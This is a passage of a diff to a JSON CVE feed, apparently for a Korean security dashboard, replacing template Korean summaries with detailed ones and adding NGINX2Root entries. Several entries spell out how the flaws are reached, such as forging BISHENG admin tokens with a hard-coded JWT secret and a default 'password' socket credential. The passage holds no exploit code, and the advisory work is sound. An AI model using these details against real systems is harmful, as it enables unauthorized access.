-      "affected_products": [],
+      "vendor": "CPAN (IO-Socket-SSL)",
+      "product": "IO::Socket::SSL::PublicSuffix",
+      "affected_products": [
+        "IO::Socket::SSL::PublicSuffix <= 2.099 (IO-Socket-SSL, Perl)"
+      ],
       "poc_count": 0,
       "poc_links": [],
       "references": [
@@ -4465,17 +4589,17 @@
       "cwe": [
         "CWE-94"
       ],
-      "description_orig": "IO::Socket::SSL::PublicSuffix versions through 2.099 for Perl allow code injection via a fetched list line that closes the built-in data heredoc when update_self_from_url rewrites the module's source. The rewrite copies the module's source down to the built-in list's heredoc and appends each fetched line below it. Nothing checks that a line looks like a domain. A line that is not a comment loses only what follows a `//` and its trailing whitespace, so a line reading END_BUILTIN_DATA is appended as it stands and ends the data block in the rewritten file. Every fetched line after it is Perl. Arbitrary Perl runs in every process that loads IO::Socket::SSL, which loads this module unconditionally, until the file is reinstalled. The attacker must control the fetched list, through the cleartext default URL or a caller-supplied one, and the updater must run with write access to the installed module.",
+      "description_orig": "IO::Socket::SSL::PublicSuffix versions through 2.099 for Perl allow code injection via a fetched list line that closes the built-in data heredoc when update_self_from_url rewrites the module's source. A line reading END_BUILTIN_DATA ends the data block and every fetched line after it is executed as Perl in every process that loads IO::Socket::SSL until the file is reinstalled.",
       "published_at": "2026-11-18",
       "updated_at": "2026-11-19 08:11:37 KST",
-      "analyzed_by": "fallback:budget"
+      "analyzed_by": "exaone"
     },
     {
       "cve_id": "CVE-2026-128851",
       "title_ko": "Probono Form Basic 파일 업로드 취약점",
-      "summary_ko": "CVE-2026-128851는 Probono Form Basic에서 확인된 파일 업로드 취약점입니다. CVSS 9.8점(치명적)으로 평가됐습니다. 향후 30일 내 악용될 확률(EPSS)은 0.2%(악용 위험 상위 90% 수준)입니다.",
-      "impact_ko": "악성 파일 업로드를 통해 웹셸 실행이나 서버 장악이 가능합니다.",
-      "remediation_ko": "① 영향 범위는 1.3.3 미만 버전이며, 자산 목록과 대조해 1.3.3 이상 버전으로 업데이트하면 해결됩니다. ② 인터넷에 직접 노출된 서비스는 접근 제어·WAF 차단 등 임시 완화 조치를 함께 적용하고, 침해 흔적 점검을 병행하세요.",
+      "summary_ko": "Probono Form Basic WordPress 플러그인은 1.3.3 미만에서 공개 폼을 통해 업로드된 파일의 실제 형식을 검증하지 않고 클라이언트가 선언한 MIME 타입을 신뢰한다. 인증되지 않은 공격자는 공개 디렉터리에 PHP 파일을 업로드해 삭제되기 전 실행할 수 있는 환경이 있으며, 이는 플러그인의 Apache 전용 접근 제한을 서버가 준수하지 않는 경우에 해당한다. 공개 폼이 공격 표면이 된다.",
+      "impact_ko": "성공 시 공개 디렉터리에 업로드된 PHP가 실행되어 서버 장악, 데이터 유출·변조, 서비스 중단으로 이어질 수 있다.",
+      "remediation_ko": "① 1.3.3 이상으로 업데이트하고, ② 공개 폼 업로드에 서버 측 실제 파일 형식 검증과 업로드 디렉터리 내 PHP 실행 차단을 적용하며, ③ Apache 전용 접근 제한이 서버에서 준수되는지 확인하고 인터넷 노출 자산을 우선 점검한다.",
       "cvss_score": 9.8,
       "severity": "CRITICAL",
       "epss_score": 0.00199,
@@ -4504,14 +4628,14 @@
       "description_orig": "The Probono Form Basic WordPress plugin before 1.3.3 does not validate the real type of files uploaded through its public form, trusting the client-declared MIME type instead, which could allow unauthenticated attackers to upload PHP files to a public directory and execute them before they are deleted, on servers that do not honour the Probono Form Basic WordPress plugin before 1.3.3's Apache-only access restriction.",
       "published_at": "2026-11-18",
       "updated_at": "2026-11-19 08:11:37 KST",
-      "analyzed_by": "fallback:budget"
+      "analyzed_by": "exaone"
     },
     {
       "cve_id": "CVE-2026-127021",
-      "title_ko": "Flamix: Bitrix24 and WooCommerce Products Sync 파일 업로드 취약점",
-      "summary_ko": "CVE-2026-127021는 Flamix: Bitrix24 and WooCommerce Products Sync에서 확인된 파일 업로드 취약점입니다. CVSS 9.8점(치명적)으로 평가됐습니다. 향후 30일 내 악용될 확률(EPSS)은 0.2%(악용 위험 상위 91% 수준)입니다.",
-      "impact_ko": "악성 파일 업로드를 통해 웹셸 실행이나 서버 장악이 가능합니다.",
-      "remediation_ko": "① 영향 범위는 1.7.0 미만 버전이며, 자산 목록과 대조해 1.7.0 이상 버전으로 업데이트하면 해결됩니다. ② 인터넷에 직접 노출된 서비스는 접근 제어·WAF 차단 등 임시 완화 조치를 함께 적용하고, 침해 흔적 점검을 병행하세요.",
+      "title_ko": "Flamix: Bitrix24/WooCommerce Sync 파일 업로드 취약점",
+      "summary_ko": "Flamix: Bitrix24 and WooCommerce Products Sync WordPress 플러그인은 1.7.0 미만에서 인증되지 않은 파일 교환 요청을 제한하거나 검증하지 않는다. 이로 인해 공격자는 파일명과 확장자, 저장 경로를 임의로 선택한 파일을 웹에서 접근 가능한 위치에 기록할 수 있으며, 해당 파일이 PHP로 실행되는 환경에서는 임의의 PHP 코드 실행으로 이어질 수 있다. 인증 없이 요청 가능하다는 점이 핵심 악용 조건이다.",
+      "impact_ko": "성공 시 인증 없이 임의 PHP 실행이 가능해 서버 장악, 웹셸 설치, 데이터 유출·변조, 서비스 중단으로 이어질 수 있다.",
+      "remediation_ko": "① 1.7.0 이상으로 업데이트하고, ② 파일 교환 요청의 인증·검증과 저장 경로·확장자 제한을 적용하며, ③ 인터넷 노출 자산을 우선 점검해 임시 차단 또는 접근 제한을 검토한다.",
       "cvss_score": 9.8,
       "severity": "CRITICAL",
       "epss_score": 0.0019,
@@ -4540,7 +4664,7 @@
       "description_orig": "The Flamix: Bitrix24 and WooCommerce Products Sync WordPress plugin before 1.7.0 does not restrict or validate an unauthenticated file-exchange request, allowing anyone to write a file with an attacker-chosen name, extension and path to a web-served location and thereby execute arbitrary PHP.",
       "published_at": "2026-11-18",
       "updated_at": "2026-11-19 08:11:37 KST",
-      "analyzed_by": "fallback:budget"
+      "analyzed_by": "exaone"
     },
     {
       "cve_id": "CVE-2026-110960",
@@ -4616,10 +4740,10 @@
     },
     {
       "cve_id": "CVE-2026-130849",
-      "title_ko": "Bzflag 메모리 손상 취약점",
-      "summary_ko": "CVE-2026-130849는 Bzflag에서 확인된 메모리 손상 취약점입니다. CVSS 9.8점(치명적)으로 평가됐습니다.",
-      "impact_ko": "메모리 오류를 악용해 서비스가 중단되거나 원격 코드 실행으로 이어질 수 있습니다.",
-      "remediation_ko": "① 영향 범위는 2.4.32 미만 버전이며, 자산 목록과 대조해 2.4.32 이상 버전으로 업데이트하면 해결됩니다. ② 인터넷에 직접 노출된 서비스는 접근 제어·WAF 차단 등 임시 완화 조치를 함께 적용하고, 침해 흔적 점검을 병행하세요.",
+      "title_ko": "BZFlag bzfs 힙 OOB 쓰기 취약점",
+      "summary_ko": "BZFlag bzfs 2.4.32 미만에서 NetHandler::tcpReceive()에 힙 OOB 쓰기 취약점(CWE-122)이 존재한다. 원격 비인증 공격자가 본문 길이 1024의 TCP 메시지를 전송하면 tcplen 수신 오프셋을 음수로 덮어써 버퍼 앞에 제어된 바이트를 기록할 수 있다. 이는 CVSS 9.8 Critical로 평가되며 서버 충돌 또는 bzfs 사용자 권한의 명령 실행으로 이어질 수 있다.",
+      "impact_ko": "공격 성공 시 힙 메모리 손상으로 bzfs 서버가 충돌하거나 bzfs 사용자 권한으로 명령이 실행될 수 있다.",
+      "remediation_ko": "① 영향 버전(2.4.32 미만) 사용 여부를 확인하고 제조사 제공 수정 버전/패치를 적용한다. ② 인터넷에 노출된 bzfs 인스턴스를 우선 점검하고 불필요 TCP 포트 접근을 제한한다. ③ 관련 로그와 비정상 TCP 메시지를 모니터링한다.",
       "cvss_score": 9.8,
       "severity": "CRITICAL",
       "epss_score": null,
@@ -4660,14 +4784,14 @@
       "description_orig": "BZFlag bzfs before 2.4.32 contains a heap out-of-bounds write vulnerability in NetHandler::tcpReceive() that allows remote unauthenticated attackers to corrupt heap memory by sending a TCP message with a body length of exactly 1024. Attackers can overwrite the tcplen receive offset with a negative value to write controlled bytes before the buffer, crashing the server or executing commands as the bzfs user.",
       "published_at": "2026-11-17",
       "updated_at": "2026-11-18 06:40:47 KST",
-      "analyzed_by": "fallback:budget"
+      "analyzed_by": "exaone"
     },
     {
       "cve_id": "CVE-2026-130840",
-      "title_ko": "Dataelement BISHENG 인증 우회 취약점",
-      "summary_ko": "CVE-2026-130840는 Dataelement BISHENG에서 확인된 인증 우회 취약점입니다. CVSS 9.8점(치명적)으로 평가됐습니다.",
-      "impact_ko": "인증 없이 보호된 기능·관리 화면에 접근해 설정 변경과 데이터 조회가 가능합니다.",
-      "remediation_ko": "① 영향 범위는 3.0.0 미만 버전이며, 자산 목록과 대조해 3.0.0 이상 버전으로 업데이트하면 해결됩니다. ② 인터넷에 직접 노출된 서비스는 접근 제어·WAF 차단 등 임시 완화 조치를 함께 적용하고, 침해 흔적 점검을 병행하세요.",
+      "title_ko": "Dataelement BISHENG 하드코딩 JWT 비밀키 인증 우회 취약점",
+      "summary_ko": "Dataelement BISHENG 3.0.0 미만은 AuthJwt에서 하드코딩된 기본 jwt_secret을 사용하는 인증 우회 취약점(CWE-321)을 포함합니다. 공격자는 HS256 토큰을 오프라인으로 위조해 user_id 1의 admin 역할을 부여하고 access_token_cookie로 전송해 관리자로 가장할 수 있습니다. 이를 통해 사용자, 워크스페이스, 지식베이스, 워크플로에 대한 전체 관리자 권한을 얻을 수 있습니다.",
+      "impact_ko": "인증 없이 관리자 권한을 획득해 사용자·워크스페이스·지식베이스·워크플로를 관리·조작할 수 있습니다.",
+      "remediation_ko": "① 3.0.0 이상으로 업데이트하거나 제조사 패치를 적용하고, ② 하드코딩·기본 jwt_secret을 제거해 안전한 키로 교체하며 토큰 검증을 강화하고, ③ access_token_cookie 노출·이상 토큰 사용을 모니터링하고 인터넷 노출 인스턴스를 우선 점검하십시오.",
       "cvss_score": 9.8,
       "severity": "CRITICAL",
       "epss_score": null,
@@ -4704,14 +4828,14 @@
       "description_orig": "BISHENG before 3.0.0 contains an authentication bypass vulnerability that allows unauthenticated remote attackers to impersonate administrators by abusing a hard-coded default jwt_secret used by AuthJwt. Attackers can forge an HS256 token offline naming user_id 1 with the admin role, send it as access_token_cookie, and gain full administrative access to users, workspaces, knowledge bases and workflows.",
       "published_at": "2026-11-17",
       "updated_at": "2026-11-18 06:40:47 KST",
-      "analyzed_by": "fallback:budget"
+      "analyzed_by": "exaone"
     },
     {
       "cve_id": "CVE-2026-130801",
-      "title_ko": "Hanshow Technology Nebular Pro Electronic Shelf Labels 인증 우회 취약점",
-      "summary_ko": "CVE-2026-130801는 Hanshow Technology Nebular Pro Electronic Shelf Labels에서 확인된 인증 우회 취약점입니다. CVSS 9.8점(치명적)으로 평가됐습니다.",
-      "impact_ko": "인증 없이 보호된 기능·관리 화면에 접근해 설정 변경과 데이터 조회가 가능합니다.",
-      "remediation_ko": "① 영향받는 제품·버전을 자산 목록에서 확인하고, 벤더 보안 공지의 수정 버전으로 업데이트하세요. ② 인터넷에 직접 노출된 서비스는 접근 제어·WAF 차단 등 임시 완화 조치를 함께 적용하고, 침해 흔적 점검을 병행하세요.",
+      "title_ko": "Hanshow Nebular Pro 전자가격표 APDU 인증 부재 취약점",
+      "summary_ko": "Hanshow Technology Nebular Pro 전자가격표 장치의 명령 파서가 수신 APDU 패킷 검증에 비대칭 암호 서명을 요구하지 않습니다. 초기 핸드셰이크가 우회되면 공격자가 위조·승인되지 않은 명령을 주입해 장치 기능과 설정을 조작할 수 있습니다. 영향 버전은 2.0:V20241202로 명시되어 있습니다.",
+      "impact_ko": "인증되지 않은 명령 주입으로 장치 기능과 설정이 임의 조작될 수 있어 전자가격표 운영과 설정 무결성에 영향을 줄 수 있습니다.",
+      "remediation_ko": "① 제조사 패치·완화책을 확인해 적용하고, ② APDU 통신이 가능한 네트워크 접근을 제한하며 불필요한 서비스·포트를 차단하고, ③ 장치 펌웨어·설정 무결성을 점검하고 인터넷 노출 자산을 우선 점검하십시오.",
       "cvss_score": 9.8,
       "severity": "CRITICAL",
       "epss_score": null,
@@ -4740,14 +4864,14 @@
       "description_orig": "The device's command parser does not require asymmetric cryptographic signatures to validate incoming APDU packets. This enables an attacker to inject forged, unauthorized commands to manipulate device features and configurations once the initial handshake is bypassed.",
       "published_at": "2026-11-17",
       "updated_at": "2026-11-18 06:40:47 KST",
-      "analyzed_by": "fallback:budget"
+      "analyzed_by": "exaone"
     },
     {
       "cve_id": "CVE-2026-122147",
-      "title_ko": "ICRTouch PocketTouch 보안 취약점",
-      "summary_ko": "CVE-2026-122147는 ICRTouch PocketTouch에서 확인된 보안 취약점입니다. CVSS 9.8점(치명적)으로 평가됐습니다.",
-      "impact_ko": "취약점이 악용되면 시스템 기밀성·무결성이 훼손될 수 있습니다.",
-      "remediation_ko": "① 영향받는 제품·버전을 자산 목록에서 확인하고, 벤더 보안 공지의 수정 버전으로 업데이트하세요. ② 인터넷에 직접 노출된 서비스는 접근 제어·WAF 차단 등 임시 완화 조치를 함께 적용하고, 침해 흔적 점검을 병행하세요.",
+      "title_ko": "ICRTouch PocketTouch 하드코딩 기본 자격증명 취약점",
+      "summary_ko": "ICRTouch PocketTouch 1.700(build 2025.3726)은 소켓 비밀번호와 구성 및 종료 비밀번호를 포함한 여러 자격 증명 필드에 하드코딩된 기본값을 정의한다. 추가 이메일 관련 비밀번호 필드는 값 없이 초기화된다. 이러한 하드코딩 기본값은 CWE-798에 해당하며 CVSS 9.8 Critical로 평가되어, 기본값을 아는 주체의 자격증명 기반 접근 시도로 이어질 수 있다.",
+      "impact_ko": "기본값을 아는 공격자가 인증을 통과해 구성·종료 등 관련 기능에 무단 접근할 위험이 있으며, 노출 환경에서는 권한 획득으로 확대될 수 있다.",
+      "remediation_ko": "① 제조사 패치·보안 공지 확인 후 기본값 제거 또는 변경을 적용하고, ② 변경이 어려우면 해당 서비스·인터페이스를 신뢰 네트워크로 제한하며 접근통제·모니터링을 적용하고, ③ 인터넷 노출 자산 여부를 우선 점검한다.",
       "cvss_score": 9.8,
       "severity": "CRITICAL",
       "epss_score": null,
@@ -4780,14 +4904,14 @@
       "description_orig": "ICRTouch PocketTouch version 1.700 build 2025.3726 defines hard-coded default values for multiple credential fields, including a socket password and configuration and shutdown passwords. An additional email-related password field is initialized without a value.",
       "published_at": "2026-11-17",
       "updated_at": "2026-11-18 06:40:47 KST",
-      "analyzed_by": "fallback:budget"
+      "analyzed_by": "exaone"
     },
     {
       "cve_id": "CVE-2026-122142",
-      "title_ko": "ICRTouch Commander 보안 취약점",
-      "summary_ko": "CVE-2026-122142는 ICRTouch Commander에서 확인된 보안 취약점입니다. CVSS 9.8점(치명적)으로 평가됐습니다.",
-      "impact_ko": "취약점이 악용되면 시스템 기밀성·무결성이 훼손될 수 있습니다.",
-      "remediation_ko": "① 영향받는 제품·버전을 자산 목록에서 확인하고, 벤더 보안 공지의 수정 버전으로 업데이트하세요. ② 인터넷에 직접 노출된 서비스는 접근 제어·WAF 차단 등 임시 완화 조치를 함께 적용하고, 침해 흔적 점검을 병행하세요.",
+      "title_ko": "ICRTouch Commander 인증 시도 제한 미흡 취약점",
+      "summary_ko": "ICRTouch Commander의 관리자 로그인 인터페이스는 반복 인증 시도를 충분히 제한하지 않고, 여러 인증 상태에 대해 구분 가능한 응답을 반환한다. 특히 siteID 값이 제공된 경우 동작이 달라져 공격자가 인증 성공 여부를 추정하거나 무차별 대입 공격에 활용할 수 있다. 이는 CWE-307에 해당하며 CVSS 9.8 Critical로 평가되었고, 관리자 인증 구간의 통제 부재가 핵심 문제다.",
+      "impact_ko": "공격 성공 시 관리자 계정에 대한 무차별 대입·탈취 시도에 악용될 수 있고, 인증 상태 구분 정보가 공격을 돕는 데 사용될 수 있다.",
+      "remediation_ko": "① 제조사 보안 공지와 패치·완화책을 확인해 적용하고, ② 관리자 로그인 인터페이스의 인터넷 직접 노출을 제한하며, ③ 반복 인증 실패 모니터링과 차단, 강한 자격증명 사용 등 계정 보호 통제를 점검한다.",
       "cvss_score": 9.8,
       "severity": "CRITICAL",
       "epss_score": null,
@@ -4820,14 +4944,14 @@
       "description_orig": "ICRTouch Commander administrative login interface does not adequately restrict repeated authentication attempts. The interface also returns distinguishable responses for multiple authentication states, including different behavior when a `siteID` value is supplied.",
       "published_at": "2026-11-17",
       "updated_at": "2026-11-18 06:40:47 KST",
-      "analyzed_by": "fallback:budget"
+      "analyzed_by": "exaone"
     },
     {
       "cve_id": "CVE-2026-122055",
-      "title_ko": "ICRTouch PocketTouch 보안 취약점",
-      "summary_ko": "CVE-2026-122055는 ICRTouch PocketTouch에서 확인된 보안 취약점입니다. CVSS 9.8점(치명적)으로 평가됐습니다.",
-      "impact_ko": "취약점이 악용되면 시스템 기밀성·무결성이 훼손될 수 있습니다.",
-      "remediation_ko": "① 영향받는 제품·버전을 자산 목록에서 확인하고, 벤더 보안 공지의 수정 버전으로 업데이트하세요. ② 인터넷에 직접 노출된 서비스는 접근 제어·WAF 차단 등 임시 완화 조치를 함께 적용하고, 침해 흔적 점검을 병행하세요.",
+      "title_ko": "ICRTouch PocketTouch 기본 소켓 비밀번호 취약점",
+      "summary_ko": "ICRTouch PocketTouch 1.700 빌드 2025.3726에는 소켓 서비스의 기본 비밀번호가 문자 그대로 'password'로 설정되어 있다. 기본값이 변경되지 않은 상태에서 TouchPoint POS 터미널이 이를 허용하면, 터미널 소켓 서비스에 네트워크로 접근 가능한 공격자가 공개된 기본 자격 증명으로 인증할 수 있다. 제공된 정보에서 CVSS 9.8(CRITICAL), CWE-798로 표시되며 KEV에는 등재되지 않았다. 즉, 기본 비밀번호 유지와 소켓 서비스 네트워크 접근이 결합될 때 악용 가능성이 있다.",
+      "impact_ko": "공격 성공 시 공격자는 터미널 소켓 서비스에 인증하여 비인가 접근을 얻을 수 있다. 다만 데이터 유출, 권한 탈취, 서비스 중단 등 구체적 영향은 제공된 정보만으로 확인되지 않는다.",
+      "remediation_ko": "① 기본 소켓 비밀번호가 'password'로 남아 있지 않도록 변경하고 기본 자격 증명 사용 여부를 점검한다. ② 소켓 서비스 접근 가능 네트워크를 제한하며 인터넷 노출 자산을 우선 점검한다. ③ 제조사 보안 권고와 업데이트를 확인하고 적용 가능한 완화 조치를 반영한다.",
       "cvss_score": 9.8,
       "severity": "CRITICAL",
       "epss_score": null,
@@ -4860,7 +4984,7 @@
       "description_orig": "ICRTouch PocketTouch version 1.700 build 2025.3726 contains a default socket password set to the literal value password. Where the default value remains unchanged and is accepted by a TouchPoint POS terminal, an attacker with network access to the terminal’s socket service may authenticate using publicly known credentials.",
       "published_at": "2026-11-17",
       "updated_at": "2026-11-18 06:40:47 KST",
-      "analyzed_by": "fallback:budget"
+      "analyzed_by": "exaone"
     },
     {
       "cve_id": "CVE-2026-130071",
@@ -5152,10 +5276,10 @@
     },
     {
       "cve_id": "CVE-2026-130327",
-      "title_ko": "Open Object Rexx ooRexx 보안 취약점",
-      "summary_ko": "CVE-2026-130327는 Open Object Rexx ooRexx에서 확인된 보안 취약점입니다. CVSS 9.3점(치명적)으로 평가됐습니다.",
-      "impact_ko": "취약점이 악용되면 시스템 기밀성·무결성이 훼손될 수 있습니다.",
-      "remediation_ko": "① 영향 범위는 5.2.0 미만 버전이며, 자산 목록과 대조해 5.2.0 이상 버전으로 업데이트하면 해결됩니다. ② 인터넷에 직접 노출된 서비스는 접근 제어·WAF 차단 등 임시 완화 조치를 함께 적용하고, 침해 흔적 점검을 병행하세요.",
+      "title_ko": "Open Object Rexx ooRexx RXAPI 임시파일 권한 취약점",
+      "summary_ko": "Open Object Rexx ooRexx 5.2.0 미만에서 RXAPI는 XDG_RUNTIME_DIR이 설정되지 않은 경우 세계 쓰기 가능한 /tmp 파일에 의존하거나 localhost TCP 10010 포트를 사용합니다. 이로 인해 임의 로컬 사용자가 RXAPI 통신을 할 수 있고, REXX 스크립트에서 실행될 매크로를 주입하는 사례가 설명되어 있습니다. CWE-732(잘못된 권한 부여) 계열로 분류됩니다.",
+      "impact_ko": "로컬 사용자가 RXAPI를 통해 악성 매크로를 주입할 수 있으며, 해당 매크로가 REXX 스크립트에서 실행될 경우 스크립트 동작에 영향을 줄 수 있습니다.",
+      "remediation_ko": "① 5.2.0 이상으로 업데이트하고, ② XDG_RUNTIME_DIR 등 안전한 런타임 경로를 설정해 world-writable /tmp 의존을 줄이며, ③ 로컬 계정 권한과 /tmp 및 RXAPI 통신 경로를 점검하고 인터넷 노출 자산이 있는 경우 우선 점검하십시오.",
       "cvss_score": 9.3,
       "severity": "CRITICAL",
       "epss_score": null,
@@ -5188,7 +5312,7 @@
       "description_orig": "In Open Object Rexx (ooRexx) before 5.2.0, RXAPI relies on a world-writable /tmp file unless XDG_RUNTIME_DIR is set, or localhost TCP port 10010, allowing RXAPI communication by any local user, e.g., for injection of a macro that will be executed by a REXX script.",
       "published_at": "2026-11-17",
       "updated_at": "2026-11-17 13:30:47 KST",
-      "analyzed_by": "fallback:budget"
+      "analyzed_by": "exaone"
     },
     {
       "cve_id": "CVE-2026-130320",
@@ -5231,11 +5355,293 @@
       "analyzed_by": "exaone"
     },
     {
+      "cve_id": "CVE-2026-123634",
+      "title_ko": "NGINX2Root — NGINX DNS 리졸버 대기열 사용 후 해제 원격 코드 실행 (CVE-2026-123634)",
+      "summary_ko": "CVE-2026-123634은 NGINX DNS 리졸버의 대기열(waiting list) 처리에서 발생하는 사용 후 해제(CWE-416) 결함입니다. resolver 지시문과 요청 데이터로 구성된 proxy_pass 대상, 그리고 mirror(mirror_request_body off) 또는 SSI 서브요청이 같은 이름을 동시에 해석하는 구성에서 이름 해석을 유발할 수 있는 공격자가 해제된 메모리를 다시 사용하게 만들어 워커 크래시와 원격 코드 실행을 일으킬 수 있습니다. 공격자가 업스트림 호스트 이름을 통제할 수 있어야 하며, F5는 CVSS 4.0 9.2·CVSS 3.1 8.1로 평가했습니다.",
+      "impact_ko": "동적 프록시 대상(변수 포함 proxy_pass)과 resolver·mirror/SSI 조합을 쓰는 NGINX Open Source 0.6.18~1.31.8이 대상입니다. 업스트림 이름을 통제하는 공격자가 워커 권한 코드 실행으로 이어갈 수 있고, HTTP/2를 끄는 조치로는 완화되지 않습니다.",
+      "remediation_ko": "① NGINX Open Source 1.30.7·1.31.9 이상, NGINX Plus 37.0.8.1·37.3.0.1 이상으로 업데이트하세요. ② 패치 전에는 요청 데이터로 proxy_pass 대상을 만들면서 mirror/SSI 서브요청이 같은 이름을 해석하는 구성을 피하고, 가능하면 resolver 결과를 고정하거나 업스트림 이름을 신뢰 가능한 값으로 제한하세요. ③ SCTP가 필요 없는 호스트는 커널 모듈 자동 로드를 차단(install sctp /bin/false)하고, 컨테이너는 호스트 커널 기준으로 점검하세요. ④ 컨테이너 이미지·Helm 차트·Kubernetes 인그레스 컨트롤러·어플라이언스에 번들된 NGINX까지 자산 목록에 넣고 배포판 백포트 여부를 벤더 공지로 확인하세요. ⑤ 워커 크래시('worker process ... exited on signal')와 비정상 프로세스 생성을 모니터링하세요.",
+      "cvss_score": 9.2,
+      "severity": "CRITICAL",
+      "epss_score": null,
+      "epss_percentile": null,
+      "is_kev": false,
+      "kev_date_added": "",
+      "kev_due_date": "",
+      "kev_required_action": "",
+      "kev_ransomware": "",
+      "vendor": "F5",
+      "product": "NGINX Open Source / NGINX Plus",
+      "affected_products": [
+        "NGINX Open Source 0.6.18 ~ 1.31.8 (resolver + 동적 proxy_pass + mirror/SSI 조합)",
+        "NGINX Plus 37.x (동일 구성)"
+      ],
+      "poc_count": 1,
+      "poc_links": [
+        {
+          "name": "Censys-Research/nginx2root",
+          "url": "https://github.com/Censys-Research/nginx2root",
+          "stars": 0,
+          "description": "Censys reproductions of the five nginx2root vulnerabilities"
+        }
+      ],
+      "references": [
+        {
+          "url": "https://www.circl.lu/pub/tr-105/",
+          "title": "CIRCL TR-105 NGINX2ROOT - Remote Code Execution in NGINX and Potential Host Compromise"
+        },
+        {
+          "url": "https://cert.europa.eu/publications/security-advisories/2026-022/",
+          "title": "CERT-EU Security Advisory 2026-022 - Critical vulnerabilities in Nginx"
+        },
+        {
+          "url": "https://www.sophos.com/en-us/security-advisories/sophos-sa-20261118-nginx2root",
+          "title": "Sophos Advisory: NGINX Vulnerabilities - nginx2root"
+        },
+        {
+          "url": "https://blog.qualys.com/product-tech/patch-management/2026/11/18/nginx2root-five-nginx-flaws-led-by-cve-2026-123007-how-to-find-mitigate-and-patch-now",
+          "title": "Qualys: NGINX2Root - Five nginx Flaws, Led by CVE-2026-123007"
+        },
+        {
+          "url": "https://thehackernews.com/2026/11/10-year-old-nginx-http2-flaw-lets.html",
+          "title": "The Hacker News: 10-Year-Old NGINX HTTP/2 Flaw Lets Unauthenticated Attackers Execute Code"
+        },
+        {
+          "url": "https://lwn.net/Articles/1108362/",
+          "title": "LWN: NGINX2Root - Remote Code Execution vulnerabilities in nginx"
+        },
+        {
+          "url": "https://docs.nginx.com/nginx/releases/",
+          "title": "NGINX Releases (1.30.7 / 1.31.9 보안 릴리스)"
+        }
+      ],
+      "cwe": [
+        "CWE-416"
+      ],
+      "description_orig": "NGINX use-after-free in DNS resolver waiting-list processing when proxy_pass destination is built from request data and a mirror or SSI subrequest resolves the same name. Affects NGINX Open Source 0.6.18 through 1.31.8; fixed in 1.30.7 / 1.31.9. Part of NGINX2Root.",
+      "published_at": "2026-11-18",
+      "updated_at": "2026-11-19 09:32:09 KST",
+      "analyzed_by": "curated"
+    },
+    {
+      "cve_id": "CVE-2026-123633",
+      "title_ko": "NGINX2Root — NGINX HTTP/2 사용 후 해제(use-after-free) 원격 코드 실행 (CVE-2026-123633)",
+      "summary_ko": "NGINX2Root 5종 중 하나인 CVE-2026-123633은 HTTP/2 연결을 정리(connection draining)하는 과정에서 이미 해제한 메모리를 계속 참조하는 사용 후 해제(CWE-416) 결함입니다. 클라이언트가 HTTP/2로 요청을 보내고 NGINX가 업스트림 서버로 연결하는 중에 워커의 가용 연결 슬롯이 바닥나는 상황이 겹치면 해제된 연결 메모리를 다시 사용하게 되고, 인증 없이 원격에서 nginx 워커 권한의 코드 실행으로 이어질 수 있습니다. F5는 CVSS 4.0 9.2·CVSS 3.1 8.1로 평가했고 NGINX Open Source 1.19.7부터 1.31.8까지, NGINX Plus 37.0.x·37.1~37.2 계열이 영향을 받습니다.",
+      "impact_ko": "HTTP/2를 클라이언트 쪽에서 받고 프록시로 업스트림에 요청을 넘기며 worker_connections가 부족해지는 구성이 대상입니다. 공격자는 워커 크래시로 서비스를 중단시키거나, 성공 시 워커 권한으로 코드를 실행해 프록시 뒤 신뢰 경계에 발판을 만들 수 있습니다.",
+      "remediation_ko": "① NGINX Open Source 1.30.7·1.31.9 이상, NGINX Plus 37.0.8.1·37.3.0.1 이상으로 업데이트하세요. ② 패치 전에는 노출 리스너의 HTTP/2를 끄면 이 취약점은 차단됩니다(http2 off; 또는 listen의 http2 파라미터 제거). worker_connections 값을 여유 있게 조정하는 것은 완화일 뿐 근본 조치는 아닙니다. ③ SCTP가 필요 없는 호스트는 커널 모듈 자동 로드를 차단(install sctp /bin/false)하고, 컨테이너는 호스트 커널 기준으로 점검하세요. ④ 컨테이너 이미지·Helm 차트·Kubernetes 인그레스 컨트롤러·어플라이언스에 번들된 NGINX까지 자산 목록에 넣고 배포판 백포트 여부를 벤더 공지로 확인하세요. ⑤ 워커 크래시('worker process ... exited on signal')와 비정상 프로세스 생성을 모니터링하세요.",
+      "cvss_score": 9.2,
+      "severity": "CRITICAL",
+      "epss_score": null,
+      "epss_percentile": null,
+      "is_kev": false,
+      "kev_date_added": "",
+      "kev_due_date": "",
+      "kev_required_action": "",
+      "kev_ransomware": "",
+      "vendor": "F5",
+      "product": "NGINX Open Source / NGINX Plus",
+      "affected_products": [
+        "NGINX Open Source 1.19.7 ~ 1.31.8 (HTTP/2 프록시 + 연결 슬롯 부족 시)",
+        "NGINX Plus 37.0.0 ~ 37.0.7.1 / 37.1.0 ~ 37.2.0.1"
+      ],
+      "poc_count": 2,
+      "poc_links": [
+        {
+          "name": "Censys-Research/nginx2root",
+          "url": "https://github.com/Censys-Research/nginx2root",
+          "stars": 0,
+          "description": "Censys reproductions of the five nginx2root vulnerabilities"
+        },
+        {
+          "name": "TimTheBeastNL/nginx2root",
+          "url": "https://github.com/TimTheBeastNL/nginx2root",
+          "stars": 0,
+          "description": "Detection scanners + Docker lab for NGINX2Root (CVE-2026-123007/-123633/-121810/-123634/-113425)"
+        }
+      ],
+      "references": [
+        {
+          "url": "https://www.circl.lu/pub/tr-105/",
+          "title": "CIRCL TR-105 NGINX2ROOT - Remote Code Execution in NGINX and Potential Host Compromise"
+        },
+        {
+          "url": "https://cert.europa.eu/publications/security-advisories/2026-022/",
+          "title": "CERT-EU Security Advisory 2026-022 - Critical vulnerabilities in Nginx"
+        },
+        {
+          "url": "https://www.sophos.com/en-us/security-advisories/sophos-sa-20261118-nginx2root",
+          "title": "Sophos Advisory: NGINX Vulnerabilities - nginx2root"
+        },
+        {
+          "url": "https://blog.qualys.com/product-tech/patch-management/2026/11/18/nginx2root-five-nginx-flaws-led-by-cve-2026-123007-how-to-find-mitigate-and-patch-now",
+          "title": "Qualys: NGINX2Root - Five nginx Flaws, Led by CVE-2026-123007"
+        },
+        {
+          "url": "https://thehackernews.com/2026/11/10-year-old-nginx-http2-flaw-lets.html",
+          "title": "The Hacker News: 10-Year-Old NGINX HTTP/2 Flaw Lets Unauthenticated Attackers Execute Code"
+        },
+        {
+          "url": "https://lwn.net/Articles/1108362/",
+          "title": "LWN: NGINX2Root - Remote Code Execution vulnerabilities in nginx"
+        },
+        {
+          "url": "https://docs.nginx.com/nginx/releases/",
+          "title": "NGINX Releases (1.30.7 / 1.31.9 보안 릴리스)"
+        },
+        {
